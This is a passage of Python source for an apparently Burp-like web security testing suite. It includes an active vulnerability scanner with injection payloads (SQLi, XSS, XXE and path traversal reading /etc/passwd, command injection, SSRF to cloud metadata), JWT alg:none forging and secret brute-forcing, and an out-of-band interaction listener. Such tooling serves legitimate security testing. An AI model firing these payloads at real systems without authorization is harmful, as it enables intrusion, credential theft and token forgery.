            url = f"{self.target}?id={url_quote(p)}&user={url_quote(p)}"
            t0  = time.time()
            st, body, _ = self._req(url)
            dur = time.time()-t0
            if any(e in body.lower() for e in errors):
                return [self._mk("SQL Injection","critical",f"{ptype} SQLi via GET parameter",
                                 f"GET {url} HTTP/1.1\nHost: {urlparse(self.target).hostname}",
                                 body[:400],"Use parameterised queries / ORM","CWE-89",9.8,"high")]
            if 'SLEEP' in p and dur>2.5:
                return [self._mk("Blind Time-Based SQL Injection","critical",
                                 f"Response delay {dur:.2f}s with: {p}",
                                 f"GET {url}",f"Response time: {dur:.2f}s",
                                 "Use parameterised queries; disable blind injection paths","CWE-89",9.1,"high")]
        return []

    def _xss(self):
        for p in ["<script>alert(1)</script>","<img src=x onerror=alert(1)>","\"'><svg/onload=alert(1)>"]:
            if not self.running: break
            url = f"{self.target}?q={url_quote(p)}&search={url_quote(p)}"
            st, body, h = self._req(url)
            if p in body or url_quote(p) in body:
                csp = h.get('Content-Security-Policy','')
                return [self._mk("Reflected XSS","high" if not csp else "medium",
                                 f"Payload reflected unencoded: {p}",
                                 f"GET {url}",body[:400],
                                 "HTML-encode all user output; enforce strict CSP","CWE-79",8.2)]
        return []

    def _lfi(self):
        for p in ["../etc/passwd","..%2F..%2Fetc%2Fpasswd","....//....//etc/passwd"]:
            if not self.running: break
            url = f"{self.target}?file={p}&path={p}&page={p}"
            _, body, _ = self._req(url)
            if 'root:x:' in body or 'bin/bash' in body:
                return [self._mk("Path Traversal / LFI","high",f"System file read: {p}",
                                 f"GET {url}",body[:400],"Validate paths; use allowlists; chroot","CWE-22",9.1,"high")]
        return []

    def _cors(self):
        _, _, h = self._req(self.target,headers={'Origin':'https://evil.example.com'})
        acao=h.get('Access-Control-Allow-Origin','')
        acac=h.get('Access-Control-Allow-Credentials','')
        if 'evil' in acao or acao=='*':
            sev='critical' if acac.lower()=='true' else 'high'
            return [self._mk("CORS Misconfiguration",sev,
                             f"ACAO: {acao}  ACAC: {acac}",
                             "Origin: https://evil.example.com",
                             f"Access-Control-Allow-Origin: {acao}",
                             "Restrict CORS origin to trusted domains; never combine * with credentials","CWE-346",8.8 if sev=='critical' else 7.5)]
        return []

    def _redirect(self):
        for p in ["//evil.com","https://evil.com","/\\evil.com"]:
            _, _, h = self._req(f"{self.target}?url={url_quote(p)}&next={url_quote(p)}&redirect={url_quote(p)}")
            loc=h.get('Location','')
            if 'evil' in loc:
                return [self._mk("Open Redirect","medium",f"Server redirected to: {loc}",
                                 f"GET ?url={p}",f"Location: {loc}",
                                 "Validate redirect URLs against strict allowlist","CWE-601",6.1)]
        return []

    def _ssti(self):
        for p,expected in [("{{7*7}}","49"),("${7*7}","49"),("<%= 7*7 %>","49")]:
            _, body, _ = self._req(f"{self.target}?name={url_quote(p)}&template={url_quote(p)}")
            if expected in body:
                return [self._mk("Server-Side Template Injection (SSTI)","critical",
                                 f"Template expression {p!r} evaluated to {expected}",
                                 f"GET ?name={p}",body[:400],
                                 "Sandbox template engine; never pass user input to template renderer","CWE-94",9.8,"high")]
        return []

    def _cmdi(self):
        for p in [";sleep+3","| sleep 3","`sleep 3`","$(sleep 3)"]:
            if not self.running: break
            t0=time.time()
            self._req(f"{self.target}?cmd={url_quote(p)}&exec={url_quote(p)}")
            if time.time()-t0>2.5:
                return [self._mk("OS Command Injection","critical",
                                 f"Execution delay with: {p}",f"GET ?cmd={p}",
                                 f"Time: {time.time()-t0:.2f}s",
                                 "Never pass user input to shell; use subprocess with arg lists","CWE-78",10.0,"high")]
        return []

    def _tls(self):
        res=[]
        try:
            ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
            h=urlparse(self.target).hostname or self.target
            with socket.create_connection((h,443),timeout=5) as s:
                with ctx.wrap_socket(s) as ss:
                    prot=ss.version()
                    if prot in('TLSv1','TLSv1.1','SSLv3'):
                        res.append(self._mk("Weak TLS Version","medium",
                                            f"Server supports outdated protocol: {prot}",
                                            "TLS Client Hello",prot,"Disable TLS < 1.2; enable TLS 1.3","CWE-326",5.9))
        except Exception: pass
        return res

    def _xxe(self):
        pl='<?xml version="1.0"?><!DOCTYPE x[<!ENTITY y SYSTEM "file:///etc/passwd">]><x>&y;</x>'
        st,body,_=self._req(self.target,'POST',data=pl,headers={'Content-Type':'application/xml'})
        if 'root:x:' in body:
            return [self._mk("XXE Injection","critical",
                             "External entity expanded /etc/passwd in response",
                             f"POST {self.target}\nContent-Type: application/xml\n\n{pl[:200]}",
                             body[:400],"Disable external entity processing in XML parser","CWE-611",9.8,"high")]
        return []

    def _clickjack(self):
        _,_,h=self._req(self.target); hl={k.lower():v for k,v in h.items()}
        xfo=hl.get('x-frame-options',''); csp=hl.get('content-security-policy','')
        if not xfo and 'frame-ancestors' not in csp:
            return [self._mk("Clickjacking (Missing Framing Protection)","medium",
                             "No X-Frame-Options or CSP frame-ancestors preventing iframe embedding",
                             f"GET {self.target}","",
                             "Set X-Frame-Options: DENY or CSP frame-ancestors 'none'","CWE-1021",5.4)]
        return []

    def _ssrf(self):
        for p in ["http://127.0.0.1/","http://169.254.169.254/","http://metadata.google.internal/"]:
            _,body,_=self._req(f"{self.target}?url={url_quote(p)}&host={url_quote(p)}&src={url_quote(p)}")
            if any(x in body for x in ['ami-id','instance-id','local-hostname','169.254']):
                return [self._mk("Server-Side Request Forgery (SSRF)","high",
                                 f"Internal resource returned when requesting: {p}",
                                 f"GET ?url={p}",body[:400],
                                 "Validate/allowlist URLs; block RFC-1918 ranges in outbound requests","CWE-918",9.0,"high")]
        return []

    def _jwt_check(self):
        res=[]
        _,body,rh=self._req(self.target)
        auth=rh.get('Authorization',rh.get('authorization',''))
        if not auth: return []
        if auth.lower().startswith('bearer '):
            token=auth.split(' ',1)[1]
            parts=token.split('.')
            if len(parts)==3:
                try:
                    import base64 as _b64
                    hdr_j=_b64.b64decode(parts[0]+'==').decode('utf-8','replace')
                    if '"none"' in hdr_j.lower():
                        res.append(self._mk("JWT alg:none Vulnerability","critical",
                                            "Token header uses alg=none — signature skipped",
                                            f"Authorization: {auth[:80]}",hdr_j,
                                            "Reject tokens with alg=none; enforce RS256/HS256","CWE-347",9.1,"high"))
                    if '"hs256"' in hdr_j.lower():
                        for secret in ['secret','password','123456','changeme']:
                            try:
                                import hmac as _hmac, hashlib as _hs
                                msg2=(parts[0]+'.'+parts[1]).encode()
                                sig=_b64.urlsafe_b64encode(_hmac.new(secret.encode(),msg2,_hs.sha256).digest()).rstrip(b'=').decode()
                                if sig==parts[2]:
                                    res.append(self._mk("Weak JWT Secret","critical",
                                                        f"JWT signed with guessable secret: '{secret}'",
                                                        f"Authorization: {auth[:80]}",
                                                        f"Secret found: {secret}",
                                                        "Use a cryptographically random 256-bit secret","CWE-347",9.8,"high"))
                                    break
                            except Exception: pass
                except Exception: pass
        return res

    def _sensitive_files(self):
        paths=[('/.git/config','VCS Exposure','Git config visible','CWE-312',7.5,'high'),
               ('/.env','Env File Exposure','.env file visible','CWE-312',8.8,'high'),
               ('/phpinfo.php','PHP Info Disclosure','phpinfo() exposed','CWE-200',5.3,'medium'),
               ('/server-status','Apache Status Page','Apache mod_status exposed','CWE-200',5.3,'medium'),
               ('/robots.txt','Robots.txt Disclosure','robots.txt may reveal hidden paths','CWE-200',2.7,'low'),
               ('/web.config','ASP.NET Config Exposure','web.config visible','CWE-312',7.5,'high'),
               ('/backup.sql','Database Backup Exposed','SQL backup accessible','CWE-312',9.1,'high'),
               ('/.htaccess','.htaccess Disclosure','.htaccess file readable','CWE-312',5.3,'medium')]
        res=[]
        for path,name,desc,cwe,cvss,conf in paths:
            if not self.running: break
            url=self.target+path; st,body,_=self._req(url)
            if st and st<400 and len(body)>20:
                res.append(self._mk(name,'medium' if cvss<7 else 'high',desc,
                                    f"GET {url} HTTP/1.1",body[:400],
                                    "Remove or protect the file with server-level access control",cwe,cvss,conf))
        return res

    def _http_methods(self):
        dangerous=['DELETE','TRACE','PUT','CONNECT','OPTIONS']
        found_methods=[]
        for m in dangerous:
            if not self.running: break
            st,_,_=self._req(self.target,method=m)
            if st and st not in(405,501):
                found_methods.append(f"{m}→{st}")
        if found_methods:
            return [self._mk("Dangerous HTTP Methods Enabled","low",
                             f"Methods accepted: {', '.join(found_methods)}",
                             f"OPTIONS {self.target}",str(found_methods),
                             "Disable unused HTTP methods in server config","CWE-650",4.3)]
        return []

# ========== COLLABORATOR (self-hosted OOB interaction listener) ==========
class CollaboratorServer(QObject):
    """A self-hosted out-of-band (OAST) interaction listener, in the spirit of
    Burp Collaborator / Interactsh — but genuinely self-hosted, not a public
    service. It generates unique interaction IDs, then runs:

    - An HTTP listener that accepts ANY method/path and logs the full
      request whenever one of those IDs shows up in the Host header or path.
    - A minimal DNS listener that parses raw UDP query packets and logs any
      lookup for `<id>.<domain>`, answering with a configurable IP so blind
      SSRF/XXE that only trigger a DNS resolution (no full HTTP fetch) are
      still caught.

    IMPORTANT: for a target application to actually reach this listener, it
    must be able to route to wherever this process is running — either the
    same host/LAN, or a public domain/tunnel (ngrok, Cloudflare Tunnel, a
    VPS with a wildcard DNS record, etc.) that the user points at this
    machine themselves. This class has no public internet infrastructure of
    its own.
    """
    interaction = pyqtSignal(dict)
    log = pyqtSignal(str)

    def __init__(self, http_port=8898, dns_port=8899, answer_ip="127.0.0.1"):
        super().__init__()
        self.http_port = http_port
        self.dns_port = dns_port
        self.answer_ip = answer_ip
        self.running = False
        self._http_srv = None
        self._dns_sock = None
        self.interaction_ids: Dict[str, str] = {}   # id -> label

    def new_id(self, label: str = "") -> str:
        token = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
        self.interaction_ids[token] = label
        return token

    def start(self):
        if self.running:
            return
        self.running = True
        try:
            self._http_srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._http_srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._http_srv.bind(('0.0.0.0', self.http_port))
            self._http_srv.listen(64)
            self._http_srv.settimeout(1.0)
            threading.Thread(target=self._accept_http, daemon=True).start()
            self.log.emit(f"HTTP listener started on 0.0.0.0:{self.http_port}")
        except Exception as e:
            self.log.emit(f"HTTP listener failed: {e}")
            self.running = False
            return
        try:
            self._dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._dns_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._dns_sock.bind(('0.0.0.0', self.dns_port))
            self._dns_sock.settimeout(1.0)
            threading.Thread(target=self._accept_dns, daemon=True).start()
            self.log.emit(f"DNS listener started on 0.0.0.0:{self.dns_port}")
        except Exception as e:
            self.log.emit(f"DNS listener failed (non-fatal, HTTP still runs): {e}")

    def stop(self):
        self.running = False
        for sock in (self._http_srv, self._dns_sock):
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
        self.log.emit("Collaborator listeners stopped")

    # ---------- HTTP side ----------
    def _accept_http(self):
        while self.running:
            try:
                cs, ca = self._http_srv.accept()
                threading.Thread(target=self._handle_http, args=(cs, ca), daemon=True).start()
            except socket.timeout:
                continue
            except Exception:
                break

    def _handle_http(self, cs: socket.socket, ca):
        try:
            cs.settimeout(5.0)
            data = b""
            while b"\r\n\r\n" not in data and len(data) < 65536:
                chunk = cs.recv(4096)
                if not chunk:
                    break
                data += chunk
            head, _, rest = data.partition(b"\r\n\r\n")
            lines = head.decode('utf-8', 'replace').split("\r\n")
            if not lines or not lines[0]:
                cs.close()
                return
            req_line = lines[0]
            parts = req_line.split(' ')
            method = parts[0] if parts else 'GET'
            path = parts[1] if len(parts) > 1 else '/'
            headers = {}
            for line in lines[1:]:
                if ':' in line:
                    k, v = line.split(':', 1)
                    headers[k.strip()] = v.strip()
            content_length = int(headers.get('Content-Length', 0) or 0)
            body = rest
            while len(body) < content_length and len(body) < 65536:
                chunk = cs.recv(4096)
                if not chunk:
                    break
                body += chunk

            matched_id = self._match_id(path, headers.get('Host', ''))
            record = dict(
                itype='HTTP', ts=time.time(), src=ca[0], method=method,
                path=path, headers=headers, body=body.decode('utf-8', 'replace')[:4000],
                interaction_id=matched_id or '(unmatched)',
                label=self.interaction_ids.get(matched_id, '') if matched_id else '',
            )
            self.interaction.emit(record)

            resp_body = b"OK\n"
            resp = (f"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n"
                    f"Content-Length: {len(resp_body)}\r\nConnection: close\r\n\r\n").encode() + resp_body
            cs.sendall(resp)
        except Exception:
            pass
        finally:
            try:
                cs.close()
            except Exception:
                pass

    def _match_id(self, path: str, host: str) -> Optional[str]:
        for token in self.interaction_ids:
            if token in path or token in host:
                return token
        return None

    # ---------- DNS side (minimal parser — QNAME + QTYPE only) ----------
    def _accept_dns(self):
        while self.running:
            try:
                data, addr = self._dns_sock.recvfrom(512)
                self._handle_dns(data, addr)
            except socket.timeout:
                continue
            except Exception:
                continue

    def _parse_dns_qname(self, data: bytes, offset: int) -> Tuple[str, int]:
        labels = []
        while True:
            if offset >= len(data):
                break
            length = data[offset]
            if length == 0:
                offset += 1
                break
            offset += 1
            labels.append(data[offset:offset + length].decode('ascii', 'replace'))
            offset += length
        return '.'.join(labels), offset

    def _handle_dns(self, data: bytes, addr):
        try:
            if len(data) < 12:
                return
            txn_id = data[0:2]
            qdcount = struct.unpack('!H', data[4:6])[0]
            if qdcount < 1:
                return
            qname, offset = self._parse_dns_qname(data, 12)
            qtype = struct.unpack('!H', data[offset:offset + 2])[0] if offset + 2 <= len(data) else 0
            qtype_name = {1: 'A', 28: 'AAAA', 16: 'TXT', 5: 'CNAME', 255: 'ANY'}.get(qtype, str(qtype))

            matched_id = self._match_id(qname, '')
            record = dict(
                itype='DNS', ts=time.time(), src=addr[0], method=qtype_name,
                path=qname, headers={}, body='',
                interaction_id=matched_id or '(unmatched)',
                label=self.interaction_ids.get(matched_id, '') if matched_id else '',
            )
            self.interaction.emit(record)

            # Best-effort A-record answer so the resolving client completes
            # its lookup rather than timing out (useful for confirming SSRF).
            if qtype == 1:
                response = txn_id + b'\x81\x80' + struct.pack('!H', 1) + struct.pack('!H', 1) \
                          + b'\x00\x00\x00\x00'
                response += data[12:offset + 4]
                response += b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
                response += socket.inet_aton(self.answer_ip)
                self._dns_sock.sendto(response, addr)
        except Exception:
            pass

# ========== SYNTAX HIGHLIGHTER ==========
class HTTPHighlighter(QSyntaxHighlighter):
    def __init__(self, doc):
        super().__init__(doc)
        self.rules = []
        def add(pat, color, bold=False):
            f = QTextCharFormat()
            f.setForeground(QColor(color))
            if bold:
                f.setFontWeight(700)
            self.rules.append((re.compile(pat), f))
        add(r'\b(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\b', T.GREEN, bold=True)
        add(r'\bHTTP/\d\.\d\b', T.CYAN, bold=True)
        add(r'\b[2]\d{2}\b', T.GREEN)
        add(r'\b[3]\d{2}\b', T.CYAN)
        add(r'\b[4]\d{2}\b', T.YELLOW)
        add(r'\b[5]\d{2}\b', T.RED)
        add(r'^[\w\-]+:', T.BLUE)
        add(r'https?://\S+', T.CYAN)
        add(r'"[^"]*"', T.YELLOW)
        add(r'§[^§]*§', T.PINK)
        # Dims the literal " \r \n" markers inserted by the Repeater's CRLF
        # display toggle — purely cosmetic, never matches real request text
        # since real bodies essentially never contain that exact 5-char
        # sequence of printable backslash/r/backslash/n glyphs.
        add(r' \\r \\n', T.TXT3)

    def highlightBlock(self, text):
        for pat, fmt in self.rules:
            for m in pat.finditer(text):
                self.setFormat(m.start(), m.end() - m.start(), fmt)

# ========== JWT ANALYZER ==========
class JWTAnalyzer:
    @staticmethod
    def decode(token: str) -> dict:
        parts = token.strip().split('.')
        if len(parts) < 2:
            raise ValueError("Not a JWT")
        result = {}
        for i, part in enumerate(parts[:2]):
            pad = 4 - len(part) % 4
            try:
                raw = base64.b64decode(part + '=' * pad)
                result[['header', 'payload'][i]] = json.loads(raw)
            except Exception as e:
                result[['header', 'payload'][i]] = {"error": str(e)}
        return result

    @staticmethod
    def encode_none_attack(token: str) -> str:
        parts = token.strip().split('.')
        if len(parts) < 2:
            return ""
        h = json.loads(base64.b64decode(parts[0] + '=='))
        h['alg'] = 'none'
        new_h = base64.b64encode(json.dumps(h, separators=(',', ':')).encode()).decode().rstrip('=')
        return f"{new_h}.{parts[1]}."

    @staticmethod
    def brute_sign(token: str, wordlist: List[str]) -> Optional[str]:
        if not HAS_JWT:
            return None
        parts = token.strip().split('.')
        if len(parts) < 3:
            return None
        for secret in wordlist:
            try:
                pyjwt.decode(token, secret, algorithms=["HS256"])
                return secret
            except pyjwt.InvalidSignatureError:
                continue
            except Exception:
                continue
        return None

    @staticmethod
    def re_sign(header_json: str, payload_json: str, secret: str, alg='HS256') -> str:
        if not HAS_JWT:
            raise RuntimeError("Install pyjwt")
        payload = json.loads(payload_json)
        token = pyjwt.encode(payload, secret, algorithm=alg,
                             headers=json.loads(header_json))
        return token if isinstance(token, str) else token.decode()

# ========== DIFF ENGINE ==========
class Differ:
    @staticmethod
    def diff(a: str, b: str) -> List[Tuple[str, str]]:
        import difflib
        lines_a = a.splitlines()
        lines_b = b.splitlines()
        sm = difflib.SequenceMatcher(None, lines_a, lines_b, autojunk=False)
        result = []
        for op, i1, i2, j1, j2 in sm.get_opcodes():
            if op == 'equal':
                for l in lines_a[i1:i2]:
                    result.append(('=', l))
            elif op == 'insert':
                for l in lines_b[j1:j2]:
                    result.append(('+', l))
            elif op == 'delete':
                for l in lines_a[i1:i2]:
                    result.append(('-', l))
            elif op == 'replace':
                for l in lines_a[i1:i2]:
                    result.append(('-', l))
                for l in lines_b[j1:j2]:
                    result.append(('+', l))
        return result

class SimpleWSClient(QObject):
    """Minimal RFC6455 WebSocket client (stdlib only: socket/ssl/struct/base64)
    for Repeater's WebSocket tab — connect, send text frames, receive frames,
    ping/pong, clean close. Runs its receive loop on a daemon thread and
    reports everything back to the GUI thread via Qt signals."""
    message = pyqtSignal(str, str)   # (direction: 'sent'|'recv'|'info'|'error', text)
    closed = pyqtSignal()

    def __init__(self):
        super().__init__()
        self._sock = None
        self._running = False

    def connect_to(self, url: str, extra_headers: str = ""):
        try:
            p = urlparse(url)
            if p.scheme not in ("ws", "wss"):
                self.message.emit("error", "URL must start with ws:// or wss://"); return
            host = p.hostname
            if not host:
                self.message.emit("error", "Missing host in URL"); return
            port = p.port or (443 if p.scheme == "wss" else 80)
            path = p.path or "/"
            if p.query: path += "?" + p.query

            raw = socket.create_connection((host, port), timeout=10)
            if p.scheme == "wss":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                raw = ctx.wrap_socket(raw, server_hostname=host)
            self._sock = raw

            key = base64.b64encode(os.urandom(16)).decode()
            req_lines = [
                f"GET {path} HTTP/1.1", f"Host: {host}",
                "Upgrade: websocket", "Connection: Upgrade",
                f"Sec-WebSocket-Key: {key}", "Sec-WebSocket-Version: 13",
            ]
            for hl in (extra_headers or "").split("\n"):
                hl = hl.strip()
                if ":" in hl: req_lines.append(hl)
            req_lines += ["", ""]
            raw.sendall("\r\n".join(req_lines).encode())

            resp = b""
            while b"\r\n\r\n" not in resp:
                chunk = raw.recv(4096)
                if not chunk: raise ConnectionError("Connection closed during handshake")
                resp += chunk
            status_line = resp.split(b"\r\n", 1)[0].decode(errors="replace")
            if " 101 " not in status_line:
                self.message.emit("error", f"Handshake failed: {status_line}"); return

            self._running = True
            self.message.emit("info", f"Connected — {status_line}")
            threading.Thread(target=self._recv_loop, daemon=True).start()
        except Exception as ex:
            self.message.emit("error", str(ex))

    def _recv_loop(self):
        buf = b""
        try:
            while self._running:
                chunk = self._sock.recv(4096)
                if not chunk: break
                buf += chunk
                while True:
                    frame, consumed = self._try_parse_frame(buf)
                    if frame is None: break
                    buf = buf[consumed:]
                    opcode, payload = frame
                    if opcode == 0x8:
                        self._running = False; break
                    elif opcode == 0x9:
                        self._send_frame(0xA, payload)
                    elif opcode in (0x1, 0x2):
                        try: text = payload.decode('utf-8', 'replace')
                        except Exception: text = repr(payload)
                        self.message.emit("recv", text)
        except Exception as ex:
            if self._running:
                self.message.emit("error", str(ex))
        finally:
            self._running = False
            self.closed.emit()

    @staticmethod
    def _try_parse_frame(buf: bytes):
        if len(buf) < 2: return None, 0
        b0, b1 = buf[0], buf[1]
        opcode = b0 & 0x0F
        masked = bool(b1 & 0x80)
        plen = b1 & 0x7F
        idx = 2
        if plen == 126:
            if len(buf) < 4: return None, 0
            plen = struct.unpack(">H", buf[2:4])[0]; idx = 4
        elif plen == 127:
            if len(buf) < 10: return None, 0
            plen = struct.unpack(">Q", buf[2:10])[0]; idx = 10
        if masked:
            if len(buf) < idx + 4: return None, 0
            mask = buf[idx:idx+4]; idx += 4
        else:
            mask = None
        if len(buf) < idx + plen: return None, 0
        payload = buf[idx:idx+plen]
        if mask:
            payload = bytes(b3 ^ mask[i3 % 4] for i3, b3 in enumerate(payload))
        return (opcode, payload), idx + plen

    def _send_frame(self, opcode: int, payload: bytes):
        if not self._sock: return
        b0 = 0x80 | opcode
        plen = len(payload)
        if plen < 126:
            header = bytes([b0, 0x80 | plen])
        elif plen < 65536:
            header = bytes([b0, 0x80 | 126]) + struct.pack(">H", plen)
        else:
            header = bytes([b0, 0x80 | 127]) + struct.pack(">Q", plen)
        mask = os.urandom(4)
        masked_payload = bytes(b3 ^ mask[i3 % 4] for i3, b3 in enumerate(payload))
        try:
            self._sock.sendall(header + mask + masked_payload)
        except Exception as ex:
            self.message.emit("error", f"Send failed: {ex}")

    def send_text(self, text: str):
        if not self._running:
            self.message.emit("error", "Not connected"); return
        self._send_frame(0x1, text.encode('utf-8'))
        self.message.emit("sent", text)

    def disconnect(self):
        if self._sock and self._running:
            try: self._send_frame(0x8, b"")
            except Exception: pass
        self._running = False
        try:
            if self._sock: self._sock.close()
        except Exception: pass

# ========== TOGGLE SWITCH ==========
class ToggleSwitch(QWidget):
    """A real pill-track / sliding-knob switch (iOS/Material style), for
    binary on/off controls — Intercept is the flagship use, since a plain
    checkable button just changing color doesn't read as clearly as an
    actual switch does for a control this load-bearing. Exposes the same
    surface a QPushButton.setCheckable(True) button would (toggled signal,
    setChecked/isChecked) so it drops in without touching call sites.
    Track and knob colors are read from the global T on every paint, so it
    follows theme changes automatically like everything else."""
    toggled = pyqtSignal(bool)

    def __init__(self, checked: bool = False, on_color: str = None, parent=None):
        super().__init__(parent)
        self._checked = checked
        self._on_color = on_color   # None -> use T.GREEN at paint time
        self._knob_pos = 1.0 if checked else 0.0
        self._hover = False
        self.setFixedSize(42, 22)
        self.setCursor(Qt.CursorShape.PointingHandCursor)
        self._anim = QPropertyAnimation(self, b"knobPos", self)
        self._anim.setDuration(140)
        self._anim.setEasingCurve(QEasingCurve.Type.OutCubic)

    def isChecked(self) -> bool:
        return self._checked

    def setChecked(self, val: bool, animate: bool = True):
        val = bool(val)
        if val == self._checked:
            return
        self._checked = val
        self._anim.stop()
        self._anim.setStartValue(self._knob_pos)
        self._anim.setEndValue(1.0 if val else 0.0)
        if animate:
            self._anim.start()
        else:
            self._set_knob_pos(1.0 if val else 0.0)
        self.toggled.emit(self._checked)

    def mousePressEvent(self, event):
        if event.button() == Qt.MouseButton.LeftButton and self.isEnabled():
            self.setChecked(not self._checked)

    def enterEvent(self, event):
        self._hover = True
        self.update()
        super().enterEvent(event)

    def leaveEvent(self, event):
        self._hover = False
        self.update()
        super().leaveEvent(event)

    def _get_knob_pos(self):
        return self._knob_pos

    def _set_knob_pos(self, v):
        self._knob_pos = v
        self.update()

    knobPos = pyqtProperty(float, _get_knob_pos, _set_knob_pos)

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        h = self.height(); w = self.width()
        on = QColor(self._on_color or T.GREEN)
        off = QColor(T.BORDER)
        # Interpolate track color across the knob's travel so a mid-animation
        # frame doesn't just hard-cut between the two states.
        t = self._knob_pos
        track = QColor(
            int(off.red()   + (on.red()   - off.red())   * t),
            int(off.green() + (on.green() - off.green()) * t),
            int(off.blue()  + (on.blue()  - off.blue())  * t))
        if not self.isEnabled():
            # Desaturate toward the theme's muted GLOW tone so a disabled
            # switch doesn't read as "on and interactive" at a glance.
            mute = QColor(T.GLOW)
            track = QColor(
                int((track.red()   + mute.red())   / 2),
                int((track.green() + mute.green()) / 2),
                int((track.blue()  + mute.blue())  / 2))
        elif self._hover:
            track = track.lighter(112)
        p.setPen(Qt.PenStyle.NoPen)
        p.setBrush(track)
        p.drawRoundedRect(0, 0, w, h, h / 2, h / 2)
        knob_d = h - 4
        knob_x = 2 + (w - knob_d - 4) * t
        knob_y = 2
        # Soft pseudo-shadow beneath the knob (Qt style sheets can't do
        # box-shadow, and a full QGraphicsDropShadowEffect on the whole
        # widget would also shadow the track) — a slightly larger, low-alpha
        # dark ellipse drawn just behind/below the knob fakes the same
        # "lifted" depth cue cheaply and safely.
        shadow = QColor(0, 0, 0, 55 if _DARK_MODE else 35)
        p.setBrush(shadow)
        p.drawEllipse(int(knob_x) - 1, knob_y + 1, knob_d + 2, knob_d + 2)
        p.setBrush(QColor("#ffffff") if self.isEnabled() else QColor(T.TXT3))
        p.drawEllipse(int(knob_x), knob_y, knob_d, knob_d)


class _LabeledToggleRow(QWidget):
    """Row container for labeled_toggle() — overrides setEnabled (a real
    virtual-method override, same pattern ToggleSwitch uses for
    mousePressEvent/paintEvent) so disabling the row correctly cascades to
    both the label and the switch. A plain instance-attribute monkeypatch
    wouldn't be reached by Qt's internal enable/disable propagation, which
    dispatches through the actual method, not per-instance Python attrs."""
    def __init__(self, switch: 'ToggleSwitch', label: QLabel, parent=None):
        super().__init__(parent)
        self._switch = switch
        self._label = label

    def setEnabled(self, v: bool):
        super().setEnabled(v)
        self._switch.setEnabled(v)
        self._label.setEnabled(v)


def labeled_toggle(text: str, checked: bool = False, on_color: str = None):
    """Wrap a ToggleSwitch with a text label — a drop-in replacement for
    `QCheckBox(text)` at flagship on/off settings where the bigger, clearer
    switch reads better than a checkbox. ToggleSwitch itself stays exactly
    as it is everywhere else (unchanged size/API/paint logic); this just
    places one next to a QLabel in a small row.
    Returns (row_widget, switch) — add row_widget to your layout, use
    switch for isChecked()/setChecked()/toggled like any other toggle."""
    lbl = QLabel(text)
    lbl.setStyleSheet(f"color:{T.TXT1};font-size:12px;background:transparent;")
    sw = ToggleSwitch(checked=checked, on_color=on_color)
    row = _LabeledToggleRow(sw, lbl)
    hl = QHBoxLayout(row)
    hl.setContentsMargins(0, 0, 0, 0)
    hl.setSpacing(8)
    hl.addWidget(sw)
    hl.addWidget(lbl, 1)
    return row, sw


# ========== MAIN WINDOW ==========
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.proxy = ProxyServer()
        self.db = self.proxy.db
        self.intercept = self.proxy.intercept
        self._cur_req_pi = None
        self._intruder = None
        self._scanner  = None
        self._intr_resp = {}
        self._autoscroll = True
        self._host_filter = None
        self._thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=10)
        # ── Repeater: per-tab "settings" defaults (Burp-style gear menu) ───
        self.rep_global_settings = {
            "update_cl": True, "unpack_compressed": True,
            "follow_redirects": False, "process_cookies_redirects": False,
            "enforce_protocol_redirects": False, "normalize_line_endings": True,
            "http1_reuse": True, "http2_reuse": True,
            "strip_connection_h2": True, "allow_alpn_override": False,
            "streaming_timeout": 30,
        }
        self._rep_closed_tabs = []      # stack of recently-closed tabs (Reopen closed tab)
        self._rep_group_colors: Dict[str, str] = {}
        self._rep_group_palette = [T.BLUE, T.PURPLE, T.CYAN, T.GREEN, T.YELLOW, T.PINK]
        self.scope    = ScopeManager()
        self.sessions = SessionManager()
        self._msg_notes: Dict[str, str] = {}
        self._msg_colors: Dict[str, str] = {}
        self._collab = CollaboratorServer()
        self._collab_payloads: List[dict] = []   # [{id, label, http_url, dns_host}]
        self._collab_interactions: List[dict] = []   # full history, survives theme rebuilds
        self._extensions_registry: Dict[str, dict] = {}   # name -> {enabled, instance}
        self.setWindowIcon(app_icon())
        self.settings = QSettings("Kingception", "v6")
        self._load_theme_pref()   # MUST run before _build_ui() — every widget's
                                   # stylesheet is baked in at construction time,
                                   # so a saved light-theme preference has to be
                                   # loaded before anything is built, not after.
        self._update_window_title()
        self.resize(1700, 1000)
        self.setStyleSheet(CSS)
        self._build_ui()
        self._connect_backend_signals()   # one-time only — see docstring
        self._connect_widget_signals()
        self._stats_timer = QTimer(self)
        self._stats_timer.timeout.connect(self._update_stats)
        self._stats_timer.start(1000)
        self._load_settings()
        self._refresh_rules()   # safe — rules_tbl created in _build_ui via _settings_tab eager path
        self._log("⚡ Kingception v1.0 ready — proxy auto‑started on 127.0.0.1:8080")
        self._log(f"CA cert: {'✅ present' if self.proxy.certs.has_ca() else '⚠ not found — generate in Settings'}")
        self._log("Configure browser: FoxyProxy → HTTP 127.0.0.1:8080")
        self._log("v6.0: dark theme, body intercept fix, chunked encoding, hex view, URL filter, theme toggle")
        # Auto‑start proxy
        self.proxy.start('127.0.0.1', 8080)

    def _update_window_title(self):
        self.setWindowTitle(
            f"⚡ Kingception v1.0  —  Professional HTTP Security Suite  "
            f"[{'Dark' if _DARK_MODE else 'Light'}]")

    def _load_theme_pref(self):
        """Read the saved dark/light preference and set the global T/CSS
        BEFORE any widget is built. (Split out of _load_settings(), which
        used to run this after _build_ui() had already constructed every
        widget with the hardcoded dark default baked in.)"""
        global T, CSS, _DARK_MODE
        dark = self.settings.value("ui/dark_mode", True)
        _DARK_MODE = dark if isinstance(dark, bool) else (str(dark).lower() != "false")
